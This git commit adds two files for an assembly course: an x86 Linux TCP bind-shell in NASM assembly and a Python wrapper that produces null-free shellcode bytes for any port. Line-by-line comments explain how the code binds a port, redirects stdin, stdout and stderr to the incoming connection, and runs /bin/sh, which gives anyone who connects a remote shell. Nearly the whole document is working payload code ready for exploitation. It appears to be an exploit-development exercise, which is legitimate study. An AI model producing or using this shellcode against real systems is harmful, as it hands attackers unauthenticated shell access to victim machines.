5f775e41a4b8ce0d0e8de7f2e255d9c745377ca3
fbc <fbc@disroot.org>
2018-05-05 01:03:43 -0400

    Add bindshell asm file and .py wrapper

---
+++ 1-tcp-bind-shell/tcp-bind-shell-wrapper.py
@@ -0,0 +1,103 @@
+#!/usr/bin/env python3
+"""
+x86 Linux TCP Bindshell Generator
+Handles portnumbers which have NULs in their hex representation
+Usage: this_script.py <port_to_bind>
+Author: fbcsec
+This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
+http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
+Student ID: SLAE - 1187
+"""
+from sys import argv
+
+if len(argv) != 2:
+    print('Usage: %s <port_to_bind>')
+    raise SystemExit
+
+port = int(argv[1])
+
+if (port > 65535):
+    print('ERROR: Port number cannot be greater than 65535.')
+    raise SystemExit
+
+if port < 256:
+    if len(hex(port)) < 4:
+        hexport = '0' + hex(port)[-1:]
+    else:
+        hexport =hex(port)[-2:]
+
+    HANDLE_PORT_NUMBER = ("\x80\xc6" + # add dh <port number low bytes>
+                        bytearray.fromhex(hexport).decode('iso-8859-1') +
+                        "\x66\x52" + # push word dx
+                        "\x31\xd2") # xor edx, edx
+
+elif hex(port)[-2:] == '00':
+    HANDLE_PORT_NUMBER = ("\x80\xc2" + # add dl <port number high bytes>
+                          bytearray.fromhex(hex(port)[2:4]).decode('iso-8859-1') +
+                          "\x66\x52" + # push word dx
+                          "\x31\xd2") # xor edx, edx
+
+else:
+    HANDLE_PORT_NUMBER = ("\x66\x68" + # push word <big endian port number>
+                         bytearray.fromhex(hex(port)[-4:-2]).decode('iso-8859-1') +
+                         bytearray.fromhex(hex(port)[-2:]).decode('iso-8859-1'))
+
+shellcode = bytearray("\x31\xdb"  # xor ebx, ebx
+"\xf7\xe3"              # mul ebx
+"\x50"                  # push eax
+"\x43"                  # inc ebx
+"\x53"                  # push ebx
+"\x6a\x02"              # push 0x02
+"\x89\xe1"              # mov ecx, esp
+"\xb0\x66"              # mov al, 0x66
+"\xcd\x80"              # int 0x80
+"\x5f"                  # pop edi
+"\x97"                  # xchg edi, eax
+"\x93"                  # xchg ebx, eax
+"\xb0\x66"              # mov al, 0x66
+"\x52"
+
++ HANDLE_PORT_NUMBER +
+
+"\x66\x53"              # push bx
+"\x89\xe1"              # mov ecx, esp
+"\x6a\x10"              # push 0x10
+"\x51"                  # push ecx
+"\x57"                  # push edi
+"\x89\xe1"              # mov ecx, esp
+"\xcd\x80"              # int 0x80
+"\x89\x51\x04"          # mov dword ptr [ecx + 0x04], edx
+"\x80\xc3\x02"          # mov bl, 0x02
+"\xb0\x66"              # mov al, 0x66
+"\xcd\x80"              # int 0x80
+"\x43"                  # inc ebx
+"\xb0\x66"              # mov al, 0x66
+"\xcd\x80"              # int 0x80
+"\x93"                  # xchg bx, eax
+"\x89\xd1"              # mov ecx, edx
+"\xb1\x02"              # mov cl, 0x02
+"\xb0\x3f"              # mov al, 0x3f
+"\xcd\x80"              # int 0x80
+"\x49"                  # dec ecx
+"\x79\xf9"              # jns short [esp - 5]
+"\x52"                  # push edx
+"\x68\x2f\x2f\x73\x68"  # push 0x68732f2f
+"\x68\x2f\x62\x69\x6e"  # push 0x6e69622f
+"\x89\xe3"              # mov ebx, esp
+"\x52"                  # push edx
+"\x89\xe2"              # mov edx, esp
+"\x52"                  # push edx
+"\x89\xe1"              # mov ecx, esp
+"\xb0\x0b"              # mov al, 0x0b
+"\xcd\x80",             # int 0x80
+'iso-8859-1')
+
+final_shellcode = ''
+
+for i in shellcode:
+    final_shellcode += '\\x'
+    final_shellcode += '%02x' % (i & 0xff)
+
+print("x86 Linux TCP Bind Shell on port " + str(port))
+print("Length: " + str(len(shellcode)) + "\n")
+print("unsigned char shellcode[] = \"" + final_shellcode + "\"")
---
+++ 1-tcp-bind-shell/tcp-bind-shell.asm
@@ -0,0 +1,115 @@
+; Simple x86 Linux TCP bindshell
+; Author: @fbcsec
+; This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
+; http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
+; Student ID: SLAE - 1187
+
+global _start
+
+section .text
+
+_start:
+
+; Set the stage - Zero EAX, EBX, and EDX
+    xor ebx, ebx
+    mul ebx         ; MUL stores high order bits in EDX and low order bits in EAX.
+                    ; so by MULing with a register that's already zero, we zero EAX and EDX.
+
+; socket(AF_INET, SOCK_STREAM, 0)
+; Get an initial file descriptor (fd) to use for further network calls.
+    push eax ; socket int protocol (0x00)
+    inc ebx  ; socketcall int call (0x01)
+    push ebx ; socket type (SOCK_STREAM (0x01))
+    push byte 0x02  ; socket domain (AF_INET (0x02))
+    mov ecx, esp    ; move pointer to socket arguments into ecx
+    mov al, 0x66    ; socketcall syscall id
+    int 0x80        ; fire syscall
+; A file descriptor for this socket is returned in EAX.
+
+; bind(FD, *sockaddr, addrlen (0x10))
+; Bind to a port number using the socket we've created so we can listen for connections.
+
+    pop edi             ; EDI is now 0x02
+    xchg edi, eax       ; sockfd is now in edi
+    xchg ebx, eax       ; EAX now contains 0x00000002 (all but al is zero)
+    mov al, 0x66        ; EAX now contains 0x00000066
+                        ; This block is because we can't predict the file descriptor returned in EAX and must ensure all of EAX's bytes higher than AL are zeroed.
+
+; build sockaddr struct on stack
+; sockaddr's format: {word family (AF_INET), word port, dword ip addreses}
+; IP and port number must be in network byte (big endian) order.
+; I.E., port 4444 is 0x5c11 normally, in network byte order it's 0x5c11.
+
+    push edx            ; push ip address to bind to (0x00000000 for all addresses (or INADDR_ANY)
+
+; Writing the port number into our struct can be tricky.
+; If the hex for our port number contains a NUL (0x00) we need to alter the code to avoid this NUL.
+; If the port number to bind to contains no NULs we can simply do this:
+    push word 0x5c11 ; PUSH '4444' in network byte order.
+
+; If we want to bind to a port below 256 we'll need to use an empty register to build the numb
+;(this is inadvisable, only root can bind to addresses under 1024)
+    ;add dh, 0x05        ; Set up port number in network byte order in a register...
+    ;push word dx        ; and then PUSH it
+    ;xor edx, edx        ; zero EDX again
+
+; If we wish to use a port number such as 43776, which in hex is AB00, we need to do something similar to the above.
+    ;add dl, 0xAB        ; set up 43776 in network byte order in a register...
+    ;push word dx        ; and then PUSH it
+    ;xor edx, edx
+
+
+    push word bx        ; push protocol family (0x02 for AF_INET)
+
+; build bind() arguments and fire syscall
+    mov ecx, esp
+    push 0x10 ; push sockaddr struct length
+    push ecx  ; push pointer to sockaddr
+    push edi  ; push file descriptor
+    mov ecx, esp ; move pointer to syscall arguments into ecx
+    int 0x80
+
+; listen(fd, int backlog)
+; Begin listening for connections on the port we've bound.
+    mov [ecx + 0x04], edx ; We re-use the bind argv array, eax is 0x00 from successful bind() return value. The backlog should be zero
+    add bl, 0x02          ; set syscall listen() (4)
+    mov al, 0x66
+    int 0x80
+
+; accept(int sockfd, null, 0x10)
+; Accept the first incoming connection to our bound port.
+; Despite what the man pages for accept(2) would have you beleive, this call is not picky about the second two arguments.
+; We can just re-use the same arguments from the last call, still in ECX.
+    inc ebx
+    mov al, 0x66
+    int 0x80
+; This returns a new file descriptor for us representing the connection.
+
+; dup2(connection_fd, fd_to_redirect)
+; duplicate stderr, stdin, and stdout to connection file handle
+; This lets us execve whatever we want and have its input, output, and errors flowing over the connection.
+
+    xchg eax, ebx               ; move connection fd into ebx (old fd)
+    mov ecx, edx                ; edx should still be zeroed, move it into ecx
+    mov cl, 0x02                ; start at 0x02 (stderr)
+
+dup2_loop:
+    mov al, 0x3f                ; move the syscall into eax
+    int 0x80                    ; fire syscall
+    dec ecx                     ; decrementing ecx will make it stdout after the first loop and stdin the last
+    jns dup2_loop               ; if ecx turns negative, don't jmp
+
+; execve /bin/sh
+
+    push edx                    ; push zeroes to terminate /bin//sh string
+    push 0x68732f2f             ; push /bin//sh to stack
+    push 0x6e69622f
+    mov ebx, esp                ; esp is a pointer to the /bin//sh string, store this in ebx
+    push edx                    ; push a null for envp and to end the argv array
+    mov edx, esp                ; store pointer to envp array in edx
+    push edx                    ; argv is an array of pointers to strings, /bin//sh must be the first argument, so we push its address to the stack.
+    mov ecx, esp                ; store pointer to argv array in ecx
+    mov al, 0x0b                ; set up syscall id and fire interrupt
+    int 0x80
+
+; At this point we should have delivered a shell to the first person connecting on our bound port.
